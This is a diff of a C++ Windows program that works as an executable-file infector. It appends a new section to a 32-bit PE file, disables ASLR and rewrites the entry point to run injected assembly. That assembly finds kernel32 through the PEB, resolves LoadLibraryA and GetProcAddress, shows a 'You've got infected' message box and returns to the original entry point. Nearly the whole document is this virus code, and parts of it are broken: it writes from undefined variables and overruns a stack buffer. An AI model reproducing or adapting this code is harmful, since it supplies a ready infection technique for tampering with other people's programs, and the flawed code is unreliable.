@@ -1,78 +1,308 @@
-#include <stdio.h>
 #include <windows.h>
+#include <imagehlp.h>
+#include <winternl.h>
+#include <stdio.h>
 #include <iostream>
+#pragma comment(lib, "imagehlp")
 
 using namespace std;
 
+// Align the given size to the given alignment and returns the aligned address
 DWORD align(DWORD size, DWORD align, DWORD address) {
     if (!(size % align))
         return address + size;
     return address + (size / align + 1) * align;
 }
 
-bool AddSection(HANDLE& hFile, PIMAGE_DOS_HEADER pDosHeader, BYTE* pByte, DWORD fileSize, DWORD bytesWritten, DWORD sizeOfSection) {
-    PIMAGE_FILE_HEADER pFileHeaders = (PIMAGE_FILE_HEADER)(pByte + pDosHeader->e_lfanew + sizeof(DWORD));
-    PIMAGE_OPTIONAL_HEADER pOptionalHeaders = (PIMAGE_OPTIONAL_HEADER)(pByte + pDosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
-    PIMAGE_SECTION_HEADER pSectionHeaders = (PIMAGE_SECTION_HEADER)(pByte + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
+bool CreateNewSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWORD fileSize, DWORD bytesWritten, DWORD sizeOfSection) {
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
+    WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;
 
     const char sectionName[] = ".inflect";
 
-    // Clear the memory of the new section header using memset
-    memset(&pSectionHeaders[pFileHeaders->NumberOfSections], 0, sizeof(IMAGE_SECTION_HEADER));
-    // Copy the name of the new section into the Name field using memcpy
-    memcpy((char*)pSectionHeaders[pFileHeaders->NumberOfSections].Name, sectionName, IMAGE_SIZEOF_SHORT_NAME);
+    // Check if '.inflect' section exist
+    for (int order = 0; order < sectionCount; order++) {
+        PIMAGE_SECTION_HEADER currentSection = pSectionHeader + order;
+        if (!strcmp((char*)currentSection->Name, sectionName)) {
+            cerr << "PE section already exists" << endl;
+            CloseHandle(hFile);
+            return false;
+        }
+    }
 
-    // Align the values of the VirtualAddress, PointerToRawData, and SizeOfRawData fields correctly
-    pSectionHeaders[pFileHeaders->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, pOptionalHeaders->SectionAlignment, 0);
-    pSectionHeaders[pFileHeaders->NumberOfSections].VirtualAddress = align(pSectionHeaders[pFileHeaders->NumberOfSections - 1].Misc.VirtualSize, pOptionalHeaders->SectionAlignment, pSectionHeaders[pFileHeaders->NumberOfSections - 1].VirtualAddress);
-    pSectionHeaders[pFileHeaders->NumberOfSections].SizeOfRawData = align(sizeOfSection, pOptionalHeaders->FileAlignment, 0);
-    pSectionHeaders[pFileHeaders->NumberOfSections].PointerToRawData = align(pSectionHeaders[pFileHeaders->NumberOfSections - 1].SizeOfRawData, pOptionalHeaders->FileAlignment, pSectionHeaders[pFileHeaders->NumberOfSections - 1].PointerToRawData);
-    pSectionHeaders[pFileHeaders->NumberOfSections].Characteristics = 0xE00000E0;
+    ZeroMemory(&pSectionHeader[sectionCount], sizeof(IMAGE_SECTION_HEADER));
+    CopyMemory(&pSectionHeader[sectionCount].Name, sectionName, 8);
+    // Using 8 bytes for section name,cause it is the maximum allowed section name size
+
+    // Insert all the required information about our new PE section
+    pSectionHeader[sectionCount].Misc.VirtualSize = align(sizeOfSection, pNtHeader->OptionalHeader.SectionAlignment, 0);
+    pSectionHeader[sectionCount].VirtualAddress = align(pSectionHeader[sectionCount - 1].Misc.VirtualSize, pNtHeader->OptionalHeader.SectionAlignment, pSectionHeader[sectionCount - 1].VirtualAddress);
+    pSectionHeader[sectionCount].SizeOfRawData = align(sizeOfSection, pNtHeader->OptionalHeader.FileAlignment, 0);
+    pSectionHeader[sectionCount].PointerToRawData = align(pSectionHeader[sectionCount - 1].SizeOfRawData, pNtHeader->OptionalHeader.FileAlignment, pSectionHeader[sectionCount - 1].PointerToRawData);
+    pSectionHeader[sectionCount].Characteristics = 0xE00000E0;
+
     /*
     0xE00000E0 = IMAGE_SCN_MEM_WRITE |
-    IMAGE_SCN_CNT_CODE |
-    IMAGE_SCN_CNT_UNINITIALIZED_DATA |
-    IMAGE_SCN_MEM_EXECUTE |
-    IMAGE_SCN_CNT_INITIALIZED_DATA |
-    IMAGE_SCN_MEM_READ
+                IMAGE_SCN_CNT_CODE  |
+                IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
+                IMAGE_SCN_MEM_EXECUTE |
+                IMAGE_SCN_CNT_INITIALIZED_DATA |
+                IMAGE_SCN_MEM_READ
     */
 
-    // Set the file pointer to the end of the new section
-    SetFilePointer(hFile, pSectionHeaders[pFileHeaders->NumberOfSections].PointerToRawData + pSectionHeaders[pFileHeaders->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
-    // End the file right here, on the last section + it's own size
+    SetFilePointer(hFile, pSectionHeader[sectionCount].PointerToRawData + pSectionHeader[sectionCount].SizeOfRawData, NULL, FILE_BEGIN);
+    // End the file right here,on the last section + it's own size
     SetEndOfFile(hFile);
-
-    // Changing the size of the image, to correspond to our modifications
-    // By adding a new section, the image size is bigger now
-    pOptionalHeaders->SizeOfImage = pSectionHeaders[pFileHeaders->NumberOfSections].VirtualAddress + pSectionHeaders[pFileHeaders->NumberOfSections].Misc.VirtualSize;
-    // After a new section is added, changing the number of section    
-    pFileHeaders->NumberOfSections += 1;
-
-    // Set the file pointer to the start of the file
+    // Change the size of the image,to correspond to modifications
+    // Adding a new section,the image size is bigger 
+    pNtHeader->OptionalHeader.SizeOfImage = pSectionHeader[sectionCount].VirtualAddress + pSectionHeader[sectionCount].Misc.VirtualSize;
+    // After adding a new section, change the number of section
+    pNtHeader->FileHeader.NumberOfSections += 1;
     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
-    // Write the modified in-memory representation of the EXE file back to disk
+    // Adding all the modifications to the file
     WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);
-
+    // CloseHandle(hFile);
     return true;
 }
 
-bool AddCode(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeaders, DWORD bytesWritten) {
-    // A new section must be the last section added,cause of the code inside
-    // AddSection function, getting to the last section to insert message
-    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(pNtHeaders);
-    PIMAGE_SECTION_HEADER last = first + (pNtHeaders->FileHeader.NumberOfSections - 1);
+bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWORD fileSize, DWORD byteWritten) {
+    // Insert code into last section
+    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
+    PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);
 
-    SetFilePointer(hFile, last->PointerToRawData, NULL, FILE_BEGIN);
-    const char message[] = "You've got infected";
-    WriteFile(hFile, message, strlen(message), &bytesWritten, 0);
+    SetFilePointer(hFile, 0, 0, FILE_BEGIN);
+    // Save the OEP
+    DWORD OEP = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;
+
+    // Disable ASLR
+    pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
+    // Change the EP to point to the last section created
+    pNtHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress;
+    WriteFile(hFile, pByte, fileSize, &byteWritten, 0);
+
+    // Obtain the opcodes
+    DWORD start(0), end(0);
+    __asm {
+        mov eax, loc1
+        mov[start], eax
+        ; we jump over the second __asm, so we dont execute it in the infector itself
+        jmp over
+        loc1 :
+    }
+
+    __asm {
+        /*
+            The purpose of this part is to read the base address of kernel32.dll
+            from PEB,walk it's export table (EAT) and search for functions
+        */
+        mov eax, fs: [30h]
+        mov eax, [eax + 0x0c]; 12
+        mov eax, [eax + 0x14]; 20
+        mov eax, [eax]
+        mov eax, [eax]
+        mov eax, [eax + 0x10]; 16
+
+        mov   ebx, eax; Take the base address of kernel32
+        mov   eax, [ebx + 0x3c]; PE header VMA
+        mov   edi, [ebx + eax + 0x78]; Export table relative offset
+        add   edi, ebx; Export table VMA
+        mov   ecx, [edi + 0x18]; Number of names
+
+        mov   edx, [edi + 0x20]; Names table relative offset
+        add   edx, ebx; Names table VMA
+        ; now lets look for a function named LoadLibraryA
+
+        LLA :
+        dec ecx
+            mov esi, [edx + ecx * 4]; Store the relative offset of the name
+            add esi, ebx; Set esi to the VMA of the current name
+            cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
+            je LLALOOP1
+            LLALOOP1 :
+        cmp dword ptr[esi + 4], 0x7262694c
+            ; L(4c)i(69)b(62)r(72)
+            je LLALOOP2
+            LLALOOP2 :
+        cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
+            je stop; if its = then jump to stop because we found it
+            jmp LLA; Load LibraryA
+            stop :
+        mov   edx, [edi + 0x24]; Table of ordinals relative
+            add   edx, ebx; Table of ordinals
+            mov   cx, [edx + 2 * ecx]; function ordinal
+            mov   edx, [edi + 0x1c]; Address table relative offset
+            add   edx, ebx; Table address
+            mov   eax, [edx + 4 * ecx]; ordinal offset
+            add   eax, ebx; Function VMA
+            ; EAX holds address of LoadLibraryA now
+
+
+            sub esp, 11
+            mov ebx, esp
+            mov byte ptr[ebx], 0x75; u
+            mov byte ptr[ebx + 1], 0x73; s
+            mov byte ptr[ebx + 2], 0x65; e
+            mov byte ptr[ebx + 3], 0x72; r
+            mov byte ptr[ebx + 4], 0x33; 3
+            mov byte ptr[ebx + 5], 0x32; 2
+            mov byte ptr[ebx + 6], 0x2e; .
+            mov byte ptr[ebx + 7], 0x64; d
+            mov byte ptr[ebx + 8], 0x6c; l
+            mov byte ptr[ebx + 9], 0x6c; l
+            mov byte ptr[ebx + 10], 0x0
+
+            push ebx
+
+            //lets call LoadLibraryA with user32.dll as argument
+            call eax;
+        add esp, 11
+            //save the return address of LoadLibraryA for later use in GetProcAddress
+            push eax
+
+            // now we look again for a function named GetProcAddress
+            mov eax, fs: [30h]
+            mov eax, [eax + 0x0c]; 12
+            mov eax, [eax + 0x14]; 20
+            mov eax, [eax]
+            mov eax, [eax]
+            mov eax, [eax + 0x10]; 16
+
+            mov   ebx, eax; Take the base address of kernel32
+            mov   eax, [ebx + 0x3c]; PE header VMA
+            mov   edi, [ebx + eax + 0x78]; Export table relative offset
+            add   edi, ebx; Export table VMA
+            mov   ecx, [edi + 0x18]; Number of names
+
+            mov   edx, [edi + 0x20]; Names table relative offset
+            add   edx, ebx; Names table VMA
+            GPA :
+        dec ecx
+            mov esi, [edx + ecx * 4]; Store the relative offset of the name
+            add esi, ebx; Set esi to the VMA of the current name
+            cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
+            je GPALOOP1
+            GPALOOP1 :
+        cmp dword ptr[esi + 4], 0x41636f72
+            ; backwards remember : r(72)o(6f)c(63)A(41)
+            je GPALOOP2
+            GPALOOP2 :
+        cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
+            ; no need to continue to look further cause there is no other function starting with GetProcAddre
+            je stp; if its = then jump to stop because we found it
+            jmp GPA
+            stp :
+        mov   edx, [edi + 0x24]; Table of ordinals relative
+            add   edx, ebx; Table of ordinals
+            mov   cx, [edx + 2 * ecx]; function ordinal
+            mov   edx, [edi + 0x1c]; Address table relative offset
+            add   edx, ebx; Table address
+            mov   eax, [edx + 4 * ecx]; ordinal offset
+            add   eax, ebx; Function VMA
+            ; EAX HOLDS THE ADDRESS OF GetProcAddress
+            mov esi, eax
+
+            sub esp, 12
+            mov ebx, esp
+            mov byte ptr[ebx], 0x4d //M
+            mov byte ptr[ebx + 1], 0x65 //e
+            mov byte ptr[ebx + 2], 0x73 //s
+            mov byte ptr[ebx + 3], 0x73 //s
+            mov byte ptr[ebx + 4], 0x61 //a
+            mov byte ptr[ebx + 5], 0x67 //g
+            mov byte ptr[ebx + 6], 0x65 //e
+            mov byte ptr[ebx + 7], 0x42 //B
+            mov byte ptr[ebx + 8], 0x6f //o
+            mov byte ptr[ebx + 9], 0x78 //x
+            mov byte ptr[ebx + 10], 0x41 //A
+            mov byte ptr[ebx + 11], 0x0
+
+            /*
+                get back the value saved from LoadLibraryA return
+                So that the call to GetProcAddress is:
+                esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
+            */
+
+            mov eax, [esp + 12]
+            push ebx; MessageBoxA
+            push eax; base address of user32.dll retrieved by LoadLibraryA
+            call esi; GetProcAddress address
+            add esp, 12
+
+            sub esp, 8
+            mov ebx, esp
+            mov byte ptr[ebx], 89;      Y
+            mov byte ptr[ebx + 1], 111; o
+            mov byte ptr[ebx + 2], 117; u
+            mov byte ptr[ebx + 3], 39; `
+            mov byte ptr[ebx + 4], 118; v
+            mov byte ptr[ebx + 5], 101; e
+            mov byte ptr[ebx + 6], 32; 
+            mov byte ptr[ebx + 7], 103; g
+            mov byte ptr[ebx + 8], 111; o
+            mov byte ptr[ebx + 9], 116; t
+            mov byte ptr[ebx + 10], 32; 
+            mov byte ptr[ebx + 11], 105; i
+            mov byte ptr[ebx + 12], 110; n
+            mov byte ptr[ebx + 13], 102; f
+            mov byte ptr[ebx + 14], 101; e
+            mov byte ptr[ebx + 15], 99;  c
+            mov byte ptr[ebx + 16], 116; t
+            mov byte ptr[ebx + 17], 101; e
+            mov byte ptr[ebx + 18], 100; d
+            mov byte ptr[ebx + 19], 0
+
+            push 0
+            push 0
+            push ebx
+            push 0
+            call eax
+            add esp, 8
+
+            mov eax, 0xdeadbeef; Original Entry point
+            jmp eax
+    }
+
+    __asm {
+    over:
+        mov eax, loc2
+            mov[end], eax
+            loc2 :
+    }
+
+    byte address[1000];
+    byte* checkpoint = ((byte*)(start));
+    DWORD* invalidEP;
+    DWORD order = 0;
+
+    while (order < ((end - 11) - start)) {
+        invalidEP = ((DWORD*)((byte*)start + order));
+        if (*invalidEP == 0xdeadbeef) {
+            /*
+                Because the value of OEP is stored in this executable's data section,
+                if we have said mov eax,OEP the self read part of the program will fill in
+                a invalid address,since we point to something that only exists here,
+                not in the infected PE's data section.
+                Solution:
+                We put a place holder with the fancy value of 0xdeadbeef,so we later alter this address
+                inside the self read byte storage to the value of OEP
+            */
+            DWORD carrier;
+            VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &carrier);
+            *invalidEP = OEP;
+        }
+        address[order] = checkpoint[order];
+        order++;
+    }
+    SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
+    WriteFile(hFile, mac, i, &byteWritten, 0);
     CloseHandle(hFile);
     return true;
 }
 
-int main(int argc, char* argv[])
-{
-    if (argc != 2) {
-        cout << "Usage: " << argv[0] << " <path-of-EXE-file>" << endl;
+int main(int argc, char* argv[]) {
+
+    if (argc < 2) {
+        cout << "Usage: " << argv[0] << " <path\\of\\EXE\\file>" << endl;
         return 1;
     }
 
@@ -80,40 +310,52 @@ int main(int argc, char* argv[])
     HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE)
     {
-        // handle error
-        cout << "Error: Invalid file, try another one" << endl;
+        cerr << "Error: Invalid file, try another one" << endl;
         return 0;
     }
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    BYTE* pByte = new BYTE[fileSize];
-    DWORD bytesWritten;
 
-    if (!ReadFile(hFile, pByte, fileSize, &bytesWritten, NULL))
-    {
-        cout << "Error: can not open file" << endl;
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (!fileSize) {
+        CloseHandle(hFile);
+        // Empty file, invalid
+        cerr << "Error adding section: Invalid path or PE format" << endl;
         return 0;
+    }
+    // Buffer to allocate
+    BYTE* pByte = new BYTE[fileSize];
+    DWORD byteWritten;
+
+    // Reading the entire file to use the PE information
+    if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL)) {
+        cerr << "Error: Fail to read file" << endl;
     }
 
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
-    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
-
     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-        cout << "Error: Invalid PE" << endl;
-        return 0; 
+        CloseHandle(hFile);
+        cerr << "Error adding section: Invalid path or PE format" << endl;
+        return 0; // Invalid PE
     }
 
-    if (!AddSection(hFile, pDosHeader, pByte, fileSize, bytesWritten, 400)) {
-        cout << "Error: Fail adding section" << endl;
+    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
+    if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
+        CloseHandle(hFile);
+        cerr << "Error: PE32+ detected, this version works only with PE32" << endl;
+        return 0; // x64 image
+    }
+
+    if (!CreateNewSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400)) {
+        cerr << "Error: Fail adding section" << endl;
         return 0;
     }
-    
-    //Lets insert data into the last section
-    if (!AddCode(hFile, pNtHeaders, bytesWritten)) {
-        cout << "Error: Fail writting code" << endl;
+
+    // Insert data into the last section
+    if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
+        cerr << "Error: Fail writting code" << endl;
         return 0;
     }
-    
-    cout << "Success inflect Message Box into " << argv[1] << endl;
+
+    cerr << "Success to infect Message Box into " << argv[1] << endl;
 
     return 0;
 }
